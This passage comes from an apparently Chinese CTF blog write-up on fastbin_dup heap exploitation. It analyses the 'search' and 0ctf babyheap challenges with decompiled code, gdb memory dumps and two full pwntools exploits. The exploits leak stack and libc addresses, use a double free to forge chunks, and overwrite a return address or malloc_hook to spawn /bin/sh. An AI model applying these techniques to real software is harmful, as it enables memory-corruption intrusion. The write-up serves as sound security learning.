class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 get_num()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; // rax</span><br><span class="line">  char *endptr; // [rsp+8h] [rbp-50h]</span><br><span class="line">  char nptr; // [rsp+10h] [rbp-48h]</span><br><span class="line">  unsigned __int64 v3; // [rsp+48h] [rbp-10h]</span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(0x28u);</span><br><span class="line">  read_until_newline((__int64)&amp;nptr, 48, 1);</span><br><span class="line">  result = strtol(&amp;nptr, &amp;endptr, 0);</span><br><span class="line">  if ( endptr == &amp;nptr )</span><br><span class="line">  &#123;</span><br><span class="line">    __printf_chk(1LL, &quot;%s is not a valid number\n&quot;, &amp;nptr);</span><br><span class="line">    result = get_num();</span><br><span class="line">  &#125;</span><br><span class="line">  __readfsqword(0x28u);</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>get_num这个函数本身有漏洞，它将输入的最大48位字符串转化为数字，但是问题就是在确定字符串时是以结尾的null来判断的，<br>所以我们如果输入48个字符的话，在报错时可能会将之后的栈内存打印出来从而泄露栈地址。</p><p>整个过程大概是以一个结构体来保存每个单词：(40个字节)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">struct words_struct </span><br><span class="line">&#123; </span><br><span class="line">  addr* words_str; //单词字符串的起始位置(其实是在句子字符串当中的) </span><br><span class="line">  int64_t size; // 单词大小 </span><br><span class="line">  addr* ptr_to_sentences; //单词所在的句子字符串的位置 </span><br><span class="line">  int64_t* size_of_sentences;//句子长度 </span><br><span class="line">  words_struct* next_word;//链表下一个节点指针 </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在删除句子时，是将word_struct中ptr_to_sentences所指向的句子释放，但未置为null。<br>在每次释放 i-&gt;sentence_ptr 之前，这个句子的内容就会全部被设置为 \x00 ，由于单词结构体中存储的单词只是句子的一个指针，<br>所以单词也会被置为 \x00 。该句子对应的那些单词仍然是存在于链表中的，并没有被删除，因此每次搜索单词的时候，仍然会判断。<br>看起来由于句子内容被置为 \x00 可以防止通过 *i-&gt;sentence_ptr 验证。然而，由于 chunk 被释放后会被放到 bin 中，<br>当 chunk 不是 fastbin 或者 chunk 被重新分配出去使用的时候，也就有可能会产生 double free 的情况。<br>此外，当句子被 memset 的时候，单词虽然都变为了 \x00 ，但是我们仍然可以通过两个 \x00 的比较来绕过 memcmp 的检测。</p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>1) 利用get_num函数的漏洞试图泄露栈地址<br>2) 泄露libc_address，从而计算出system 和 /bin/sh的地址<br>3) 利用fastbin_dup 进行double free<br>4) 利用double free来覆盖栈中的返回地址控制程序执行system(“/bin/sh”)</p><p><em>思路大抵如此，但是借鉴大佬的exp却都无法正常得到shell，不晓得哪里有问题，或许是环境不一样</em></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>先附上大佬写的exp，再多捋一捋思路，调试调试，去找到问题。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch=&quot;amd64&quot;, os=&quot;linux&quot;)</span><br><span class="line"></span><br><span class="line">p = process(&apos;./search-bf61fbb8fa7212c814b2607a81a84adf&apos;)</span><br><span class="line"></span><br><span class="line"># binsh_offset 找不到</span><br><span class="line">pop_rdi_ret = 0x400e23</span><br><span class="line">system_offset = 0x46590</span><br><span class="line">puts_offset = 0x6fd60</span><br><span class="line">binsh_offset = 1558723</span><br><span class="line"></span><br><span class="line">def leak_stack():</span><br><span class="line">    p.sendline(&apos;A&apos;*48)</span><br><span class="line">    p.recvuntil(&apos;Quit\n&apos;)</span><br><span class="line">    p.recvline()</span><br><span class="line"></span><br><span class="line">    # doesn&apos;t work all the time</span><br><span class="line">    p.sendline(&apos;A&apos;*48)</span><br><span class="line">    leak = p.recvline().split(&apos; &apos;)[0][48:]</span><br><span class="line">    return int(leak[::-1].encode(&apos;hex&apos;), 16)</span><br><span class="line"></span><br><span class="line">def leak_libc():</span><br><span class="line">    # this sentence is the same size as a list node</span><br><span class="line">    index_sentence((&apos;a&apos;*12 + &apos; b &apos;).ljust(40, &apos;c&apos;))</span><br><span class="line"></span><br><span class="line">    # delete the sentence</span><br><span class="line">    search(&apos;a&apos; * 12)</span><br><span class="line">    p.sendline(&apos;y&apos;)</span><br><span class="line"></span><br><span class="line">    # the node for this sentence gets put in the previous sentence&apos;s spot.</span><br><span class="line">    # note we made sure this doesn&apos;t reuse the chunk that was just freed by</span><br><span class="line">    # making it 64 bytes</span><br><span class="line">    index_sentence(&apos;d&apos; * 64)</span><br><span class="line"></span><br><span class="line">    # free the first sentence again so we can allocate something on top of it.</span><br><span class="line">    # this will work because 1) the sentence no longer starts with a null byte</span><br><span class="line">    # (in fact, it should be clear that it starts a pointer to 64 d&apos;s), and 2)</span><br><span class="line">    # the location where our original string contained `b` is guaranteed to be</span><br><span class="line">    # zero. this is because after the original sentence was zeroed out, nothing</span><br><span class="line">    # was allocated at offset 12, which is just padding in the structure. if</span><br><span class="line">    # we had made the first word in the string 16 bytes instead of 12, then that</span><br><span class="line">    # would put &apos;b&apos; at a location where it would not be guaranteed to be zero.</span><br><span class="line">    search(&apos;\x00&apos;)</span><br><span class="line">    p.sendline(&apos;y&apos;)</span><br><span class="line"></span><br><span class="line">    # make our fake node</span><br><span class="line">    node = &apos;&apos;</span><br><span class="line">    node += p64(0x400E90) # word pointer &quot;Enter&quot;</span><br><span class="line">    node += p64(5) # word length</span><br><span class="line">    node += p64(0x602028) # sentence pointer (GOT address of free)</span><br><span class="line">    node += p64(64) # length of sentence</span><br><span class="line">    node += p64(0x00000000) # next pointer is null</span><br><span class="line">    assert len(node) == 40</span><br><span class="line"></span><br><span class="line">    # this sentence gets allocated on top of the previous sentence&apos;s node.</span><br><span class="line">    # we can thus control the sentence pointer of that node and leak memory.</span><br><span class="line">    index_sentence(node)</span><br><span class="line"></span><br><span class="line">    # this simply receives all input from the binary and discards it, which</span><br><span class="line">    # makes parsing out the leaked address easier below.</span><br><span class="line">    p.clean()</span><br><span class="line"></span><br><span class="line">    # leak the libc address</span><br><span class="line">    search(&apos;Enter&apos;)</span><br><span class="line">    p.recvuntil(&apos;Found 64: &apos;)</span><br><span class="line">    leak = u64(p.recvline()[:8])</span><br><span class="line">    p.sendline(&apos;n&apos;) # deleting it isn&apos;t necessary</span><br><span class="line">    return leak</span><br><span class="line"></span><br><span class="line">def index_sentence(s):</span><br><span class="line">    p.sendline(&apos;2&apos;)</span><br><span class="line">    p.sendline(str(len(s)))</span><br><span class="line">    p.sendline(s)</span><br><span class="line"></span><br><span class="line">def search(s):</span><br><span class="line">    p.sendline(&apos;1&apos;)</span><br><span class="line">    p.sendline(str(len(s)))</span><br><span class="line">    p.sendline(s)</span><br><span class="line"></span><br><span class="line">def make_cycle():</span><br><span class="line">    index_sentence(&apos;a&apos;*54 + &apos; d&apos;)</span><br><span class="line">    index_sentence(&apos;b&apos;*54 + &apos; d&apos;)</span><br><span class="line">    index_sentence(&apos;c&apos;*54 + &apos; d&apos;)</span><br><span class="line"></span><br><span class="line">    search(&apos;d&apos;)</span><br><span class="line">    p.sendline(&apos;y&apos;)</span><br><span class="line">    p.sendline(&apos;y&apos;)</span><br><span class="line">    p.sendline(&apos;y&apos;)</span><br><span class="line">    search(&apos;\x00&apos;)</span><br><span class="line">    p.sendline(&apos;y&apos;)</span><br><span class="line">    p.sendline(&apos;n&apos;)</span><br><span class="line"></span><br><span class="line">def make_fake_chunk(addr):</span><br><span class="line">    # set the fwd pointer of the chunk to the address we want</span><br><span class="line">    fake_chunk = p64(addr)</span><br><span class="line">    index_sentence(fake_chunk.ljust(56))</span><br><span class="line"></span><br><span class="line">def allocate_fake_chunk(binsh_addr, system_addr):</span><br><span class="line">    # allocate twice to get our fake chunk</span><br><span class="line">    index_sentence(&apos;A&apos;*56)</span><br><span class="line">    index_sentence(&apos;B&apos;*56)</span><br><span class="line"></span><br><span class="line">    # overwrite the return address</span><br><span class="line">    buf = &apos;A&apos;*30</span><br><span class="line">    buf += p64(pop_rdi_ret)</span><br><span class="line">    buf += p64(binsh_addr)</span><br><span class="line">    buf += p64(system_addr)</span><br><span class="line">    buf = buf.ljust(56, &apos;C&apos;)</span><br><span class="line"></span><br><span class="line">    index_sentence(buf)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    stack_leak = leak_stack()</span><br><span class="line"></span><br><span class="line">    # This makes stack_addr + 0x8 be 0x40  //在泄露的栈地址附近寻找0x40用于充当fakechunk的size</span><br><span class="line">    stack_addr = stack_leak + 0x5a - 8</span><br><span class="line"></span><br><span class="line">    log.info(&apos;stack leak: %s&apos; % hex(stack_leak))</span><br><span class="line">    log.info(&apos;stack addr: %s&apos; % hex(stack_addr))</span><br><span class="line"></span><br><span class="line">    libc_leak = leak_libc()</span><br><span class="line">    libc_base = libc_leak - puts_offset</span><br><span class="line">    system_addr = libc_base + system_offset</span><br><span class="line">    binsh_addr = libc_base + binsh_offset</span><br><span class="line"></span><br><span class="line">    log.info(&apos;libc leak: %s&apos; % hex(libc_leak))</span><br><span class="line">    log.info(&apos;libc_base: %s&apos; % hex(libc_base))</span><br><span class="line">    log.info(&apos;system addr: %s&apos; % hex(system_addr))</span><br><span class="line">    log.info(&apos;binsh addr: %s&apos; % hex(binsh_addr))</span><br><span class="line"></span><br><span class="line">    make_cycle()</span><br><span class="line">    make_fake_chunk(stack_addr)</span><br><span class="line">    allocate_fake_chunk(binsh_addr, system_addr)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h1 id="例题-0ctfbabyheap"><a href="#例题-0ctfbabyheap" class="headerlink" title="例题-0ctfbabyheap"></a>例题-0ctfbabyheap</h1><h2 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h2><p>炒鸡正规的条件选项题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">./0ctfbabyheap </span><br><span class="line">===== Baby Heap in 2017 =====</span><br><span class="line">1. Allocate</span><br><span class="line">2. Fill</span><br><span class="line">3. Free</span><br><span class="line">4. Dump</span><br><span class="line">5. Exit</span><br><span class="line">Command:</span><br></pre></td></tr></table></figure><p>分配的块可以分析出有一个结构体：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">         struc_4  structure&#123; </span><br><span class="line">00000000 inuse          </span><br><span class="line">00000001 size         </span><br><span class="line">00000002 ptr           </span><br><span class="line">00000003 &#125;struc_4   ends</span><br></pre></td></tr></table></figure><p>inuse可以标记块的释放与否，size记录大小，ptr指向分配的内存地址；</p><p>各个选项就不一一列举了，每个选项就如它名字一般：<br>allocate使用calloc分配块，最大4096；<br>fill填充用户指定allocate分配的块及新的size，所以很明显可以覆盖指针云云；<br>free将inuse变为0，size归零，free掉指针，但是并未将其指向null；但是因为allocate时使用的是calloc将原空间置零，所以无法UAF。<br>dump检测完inuse位，之后可以将size大小的ptr指向的地址的内容打印出来。</p><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p><em>即使这个程序的漏洞这么明显，还是不知道怎么下手，满脑子unlink？？不过鉴于这是fastbin_dup处的学习，学学大佬们的思路。</em></p><p>目标：1.leak libc地址<br>      2.利用fastbin_dup将chunk分配到malloc_hook处（malloc_hook 是一个 libc 上的函数指针，调用 malloc 时如果该指针不为空则执行它指向的函数，可以通过写 malloc_hook 来 getshell）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/20gx  (long long)(&amp;main_arena)-0x30</span><br><span class="line">0x7fa3a2008c10 &lt;_IO_wide_data_0+304&gt;:0x00007fa3a2004d600x0000000000000000</span><br><span class="line">0x7fa3a2008c20 &lt;__memalign_hook&gt;:0x00007fa3a1ed4bf00x00007fa3a1ed5160</span><br><span class="line">0x7fa3a2008c30 &lt;__malloc_hook&gt;:0x00000000000000000x0000000000000000  &lt;-- malloc hook </span><br><span class="line">0x7fa3a2008c40 &lt;main_arena&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fa3a2008c50 &lt;main_arena+16&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fa3a2008c60 &lt;main_arena+32&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fa3a2008c70 &lt;main_arena+48&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fa3a2008c80 &lt;main_arena+64&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fa3a2008c90 &lt;main_arena+80&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fa3a2008ca0 &lt;main_arena+96&gt;:0x000055b8638813600x0000000000000000</span><br></pre></td></tr></table></figure><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><p><em>经过不断的调试，确信本机无法复现成功，因为一块0x10大小的内存被free掉以后，再次alloc本应在free掉的地址处，但是本机却会新开辟一块地方。。所以没救了:(</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"> </span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line"> </span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"> </span><br><span class="line">elf = &quot;./0ctfbabyheap&quot;</span><br><span class="line">ENV = &#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;</span><br><span class="line"> </span><br><span class="line">p = process(elf)</span><br><span class="line"> </span><br><span class="line">def alloc(size):</span><br><span class="line">    p.recvuntil(&quot;Command: &quot;)</span><br><span class="line">    p.sendline(&quot;1&quot;)</span><br><span class="line">    p.recvuntil(&quot;Size: &quot;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"> </span><br><span class="line">def fill(idx, content):</span><br><span class="line">    p.recvuntil(&quot;Command: &quot;)</span><br><span class="line">    p.sendline(&quot;2&quot;)</span><br><span class="line">    p.recvuntil(&quot;Index: &quot;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(&quot;Size: &quot;)</span><br><span class="line">    p.sendline(str(len(content)))</span><br><span class="line">    p.recvuntil(&quot;Content: &quot;)</span><br><span class="line">    p.send(content)</span><br><span class="line"> </span><br><span class="line">def free(idx):</span><br><span class="line">    p.recvuntil(&quot;Command: &quot;)</span><br><span class="line">    p.sendline(&quot;3&quot;)</span><br><span class="line">    p.recvuntil(&quot;Index: &quot;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"> </span><br><span class="line">def dump(idx):</span><br><span class="line">    p.recvuntil(&quot;Command: &quot;)</span><br><span class="line">    p.sendline(&quot;4&quot;)</span><br><span class="line">    p.recvuntil(&quot;Index: &quot;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvline()</span><br><span class="line">    return p.recvline()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x80)</span><br><span class="line"> </span><br><span class="line">free(1)</span><br><span class="line">free(2)</span><br><span class="line"> </span><br><span class="line">#gdb.attach(p)</span><br><span class="line">#main arena and heap </span><br><span class="line">#------------------------------------------------------------------------#</span><br><span class="line">gdb-peda$ x/20gx &amp;main_arena</span><br><span class="line">0x7f6dd27f3c40 &lt;main_arena&gt;:0x00000000000000000x0000000000000000 //there is no fastbin[0],don&apos;t know why...</span><br><span class="line">0x7f6dd27f3c50 &lt;main_arena+16&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7f6dd27f3c60 &lt;main_arena+32&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7f6dd27f3c70 &lt;main_arena+48&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7f6dd27f3c80 &lt;main_arena+64&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7f6dd27f3c90 &lt;main_arena+80&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7f6dd27f3ca0 &lt;main_arena+96&gt;:0x000056122eed13600x0000000000000000</span><br><span class="line">0x7f6dd27f3cb0 &lt;main_arena+112&gt;:0x00007f6dd27f3ca00x00007f6dd27f3ca0</span><br><span class="line">0x7f6dd27f3cc0 &lt;main_arena+128&gt;:0x00007f6dd27f3cb00x00007f6dd27f3cb0</span><br><span class="line">0x7f6dd27f3cd0 &lt;main_arena+144&gt;:0x00007f6dd27f3cc00x00007f6dd27f3cc0</span><br><span class="line"></span><br><span class="line">gdb-peda$ x/30gx 0x000056122eed1250</span><br><span class="line">0x56122eed1250:0x00000000000000000x0000000000000021   chunk 0,in use</span><br><span class="line">0x56122eed1260:0x00000000000000000x0000000000000000</span><br><span class="line">0x56122eed1270:0x00000000000000000x0000000000000021   chunk 1,free</span><br><span class="line">0x56122eed1280:0x00000000000000000x0000000000000000</span><br><span class="line">0x56122eed1290:0x00000000000000000x0000000000000021   chunk 2,free</span><br><span class="line">0x56122eed12a0:0x000056122eed1280  &lt;-- chunk 2&apos;s fd pointer,point to chunk 1 0x0000000000000000</span><br><span class="line">0x56122eed12b0:0x00000000000000000x0000000000000021   chunk 3,in use</span><br><span class="line">0x56122eed12c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x56122eed12d0:0x00000000000000000x0000000000000091   chunk 4,in use</span><br><span class="line">0x56122eed12e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x56122eed12f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x56122eed1300:0x00000000000000000x0000000000000000</span><br><span class="line">0x56122eed1310:0x00000000000000000x0000000000000000</span><br><span class="line">0x56122eed1320:0x00000000000000000x0000000000000000</span><br><span class="line">0x56122eed1330:0x00000000000000000x0000000000000000</span><br><span class="line"></span><br><span class="line">#------------------------------------------------------------------------#</span><br><span class="line"></span><br><span class="line">payload = p64(0)*3</span><br><span class="line">payload += p64(0x21)</span><br><span class="line">payload += p64(0)*3</span><br><span class="line">payload += p64(0x21)</span><br><span class="line">payload += p8(0xd0)</span><br><span class="line">fill(0, payload)</span><br><span class="line"> </span><br><span class="line">payload = p64(0)*3</span><br><span class="line">payload += p64(0x21)</span><br><span class="line">fill(3, payload)</span><br><span class="line"> </span><br><span class="line">#------------------------------------------------------------------------#</span><br><span class="line">gdb-peda$ x/30gx 0x000055b863881250</span><br><span class="line">0x55b863881250:0x00000000000000000x0000000000000021</span><br><span class="line">0x55b863881260:0x00000000000000000x0000000000000000</span><br><span class="line">0x55b863881270:0x00000000000000000x0000000000000021</span><br><span class="line">0x55b863881280:0x00000000000000000x0000000000000000</span><br><span class="line">0x55b863881290:0x00000000000000000x0000000000000021</span><br><span class="line">0x55b8638812a0:0x000055b8638812d0 -|  0x0000000000000000 &lt;--chunk 2&apos;s fd pointer point to chunk 4</span><br><span class="line">0x55b8638812b0:0x0000000000000000|  0x0000000000000021</span><br><span class="line">0x55b8638812c0:0x0000000000000000|  0x0000000000000000</span><br><span class="line">0x55b8638812d0:0x0000000000000000 &lt;-  0x0000000000000021 &lt;-- 0x91 was changed to 0x21 by filling chunk 3 for cheating </span><br><span class="line">0x55b8638812e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55b8638812f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55b863881300:0x00000000000000000x0000000000000000</span><br><span class="line">0x55b863881310:0x00000000000000000x0000000000000000</span><br><span class="line">0x55b863881320:0x00000000000000000x0000000000000000</span><br><span class="line">0x55b863881330:0x00000000000000000x0000000000000000</span><br><span class="line">#------------------------------------------------------------------------#</span><br><span class="line"></span><br><span class="line">alloc(0x10)   //chunk 2&apos;s address but its index is 1 </span><br><span class="line">alloc(0x10)   //chunk 4&apos;s address but its index is 2</span><br><span class="line"></span><br><span class="line">payload = p64(0)*3</span><br><span class="line">payload += p64(0x91)</span><br><span class="line">fill(3, payload)  // change  back</span><br><span class="line">alloc(0x80)       //chunk 5</span><br><span class="line">free(4)           </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">libc_base = u64(dump(2)[:8].strip().ljust(8, &quot;\x00&quot;))-0x195c98   //0x58 +(0x7fc47fa61c40 - 0x7fc47f8cc000 ) </span><br><span class="line">log.info(&quot;libc_base: &quot;+hex(libc_base))</span><br><span class="line"> </span><br><span class="line">#------------------------------------------------------------------------#</span><br><span class="line">gdb-peda$ p main_arena</span><br><span class="line">$1 = &#123;</span><br><span class="line">  mutex = 0x0, </span><br><span class="line">  flags = 0x0, </span><br><span class="line">  have_fastchunks = 0x0, </span><br><span class="line">  fastbinsY = &#123;0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0&#125;, </span><br><span class="line">  top = 